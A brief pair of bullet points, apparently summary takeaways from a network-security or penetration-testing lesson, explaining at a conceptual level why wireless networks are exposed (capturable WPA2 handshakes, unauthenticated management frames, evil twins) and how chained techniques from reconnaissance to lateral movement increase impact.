- **Wireless adds a broadcast medium where everyone hears everything.**
  WPA2 handshakes are capturable. Management frames are unauthenticated.
  Evil twins work because clients trust SSID names.

- **Individual techniques are tools. Chained techniques are operations.**
  Recon feeds MITM, MITM feeds credential capture, credentials feed
  lateral movement. Each link in the chain multiplies the impact.
